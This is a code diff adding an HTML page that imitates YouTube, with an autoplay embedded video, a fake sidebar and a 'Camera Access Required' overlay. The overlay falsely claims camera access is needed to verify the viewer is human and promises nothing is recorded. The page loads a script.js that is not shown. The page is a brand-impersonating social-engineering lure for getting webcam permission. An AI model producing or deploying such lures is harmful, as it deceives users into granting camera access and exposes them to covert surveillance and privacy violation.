@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Live</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <nav class="navbar">
+        <div class="nav-left">
+            <div class="logo">YouTube</div>
+        </div>
+        <div class="nav-center">
+            <input type="text" placeholder="Search" class="search-bar">
+        </div>
+        <div class="nav-right">
+            <div class="profile-icon">👤</div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="video-section">
+            <!-- Video Player (YouTube Video) -->
+            <div class="video-wrapper">
+                <!-- ⬇️ YAHAN APNI VIDEO DAALI GAYI HAI ⬇️ -->
+                <iframe id="youtube-video" 
+                        src="https://www.youtube.com/embed/sciKttcTabQ?autoplay=1" 
+                        title="YouTube video player" 
+                        frameborder="0" 
+                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                        referrerpolicy="strict-origin-when-cross-origin" 
+                        allowfullscreen>
+                </iframe>
+            </div>
+            
+            <!-- Video Title -->
+            <h1 class="video-title">Live Stream: Exclusive Content</h1>
+            
+            <!-- Camera Permission Overlay -->
+            <div id="permission-overlay">
+                <div class="permission-box">
+                    <h2>🔴 Camera Access Required</h2>
+                    <p>To verify you're a human and prevent bots, please allow camera access.</p>
+                    <p class="small-text">Your video will NOT be recorded or stored anywhere.</p>
+                    <div class="button-group">
+                        <button id="allow-btn" class="btn-allow">✅ Allow Camera</button>
+                        <button id="deny-btn" class="btn-deny">❌ Deny</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-video">
+                <div class="thumb"></div>
+                <div class="info">
+                    <h4>Trending Video</h4>
+                    <p>2.5M views</p>
+                </div>
+            </div>
+            <div class="sidebar-video">
+                <div class="thumb"></div>
+                <div class="info">
+                    <h4>Popular Live Stream</h4>
+                    <p>1.2M views</p>
+                </div>
+            </div>
+            <div class="sidebar-video">
+                <div class="thumb"></div>
+                <div class="info">
+                    <h4>Recommended</h4>
+                    <p>800K views</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
